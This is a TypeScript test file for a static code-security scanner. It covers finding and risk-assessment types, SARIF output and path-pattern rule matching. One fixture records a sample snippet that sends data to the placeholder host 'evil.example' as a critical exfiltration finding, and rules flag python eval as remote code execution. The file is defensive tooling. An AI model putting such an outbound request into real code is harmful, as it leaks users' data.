import { describe, expect, expectTypeOf, it } from "vitest";
import { renderRemediationList, renderSarifReport } from "../src/index.js";
import { compileRule } from "../src/ruleTypes.js";
import type { RuleDefinition } from "../src/ruleTypes.js";
import type {
  Finding,
  FindingCategory,
  OutputFormat,
  ResolvedTarget,
  RiskAssessment,
  ScanOptions
} from "../src/index.js";

describe("core types", () => {
  it("supports blocking security findings", () => {
    const finding: Finding = {
      id: "finding-1",
      riskLevel: "Critical",
      category: "data-exfiltration",
      filePath: "src/index.ts",
      lineStart: 1,
      lineEnd: 5,
      codeSnippet: "https.request('https://evil.example')",
      explanation: "Sensitive data is sent to an external destination.",
      recommendedFix: "Remove the outbound request or require explicit user consent.",
      evidenceTags: ["network", "secret-source"],
      confidence: "High"
    };

    expect(finding.riskLevel).toBe("Critical");
  });

  it("supports decision output", () => {
    const risk: RiskAssessment = {
      overallRiskLevel: "Critical",
      decision: "Block",
      rationale: "A critical exfiltration finding is present.",
      topRisks: ["Sensitive data leaves the machine."],
      severityCounts: { Critical: 1, High: 0, Medium: 0, Low: 0, Info: 0 },
      categoryCounts: { "data-exfiltration": 1 },
      blockingFindingIds: ["finding-1"],
      residualRisk: "Do not run until the exfiltration path is removed.",
      scanLimitations: ["Static analysis only."]
    };

    expect(risk.decision).toBe("Block");
  });

  it("exports canonical category and output format vocabularies", () => {
    const category = "data-exfiltration" satisfies FindingCategory;
    const outputFormat = "sarif" satisfies OutputFormat;
    const pdfFormat = "pdf" satisfies OutputFormat;
    // @ts-expect-error invalid finding categories must be rejected
    const invalidCategory: FindingCategory = "crypto-mining";
    void invalidCategory;
    // @ts-expect-error invalid output formats must be rejected
    const invalidOutputFormat: OutputFormat = "docx";
    void invalidOutputFormat;

    expectTypeOf<Finding["category"]>().toEqualTypeOf<FindingCategory>();
    expectTypeOf<ScanOptions["outputFormats"]>().toEqualTypeOf<OutputFormat[]>();
    expectTypeOf<ResolvedTarget["localPath"]>().toEqualTypeOf<string | null>();
    expectTypeOf<RiskAssessment["categoryCounts"]>().toEqualTypeOf<
      Partial<Record<FindingCategory, number>>
    >();

    expect(category).toBe("data-exfiltration");
    expect(outputFormat).toBe("sarif");
    expect(pdfFormat).toBe("pdf");
    const validFormats: OutputFormat[] = ["markdown", "json", "sarif", "mermaid", "html", "pdf"];
    expect(validFormats).toContain("pdf");
  });

  it("exports SARIF and remediation renderers from the public entrypoint", () => {
    expect(renderSarifReport).toEqual(expect.any(Function));
    expect(renderRemediationList).toEqual(expect.any(Function));
  });
});

describe("compileRule pathPattern", () => {
  it("only matches items whose filePath satisfies the pattern", () => {
    const rule = compileRule({
      id: "py-test",
      description: "python eval",
      category: "remote-code-execution",
      defaultRiskLevel: "High",
      inventoryField: "dangerousCalls",
      pathPattern: "**/*.py",
      conditions: [{ field: "pattern", operator: "equals", value: "python.eval" }],
      explanation: "explain",
      recommendedFix: "fix",
      tags: []
    });

    expect(rule.match({ filePath: "src/main.py", pattern: "python.eval" })).toBe(true);
    expect(rule.match({ filePath: "src/main.ts", pattern: "python.eval" })).toBe(false);
  });

  it("matches all paths when pathPattern is absent", () => {
    const rule = compileRule({
      id: "no-pattern",
      description: "any",
      category: "network",
      defaultRiskLevel: "Medium",
      inventoryField: "networkEndpoints",
      conditions: [{ field: "endpoint", operator: "contains", value: "http" }],
      explanation: "explain",
      recommendedFix: "fix",
      tags: []
    });

    expect(rule.match({ filePath: "anything/at/all.ts", endpoint: "https://x.test" })).toBe(true);
  });
});
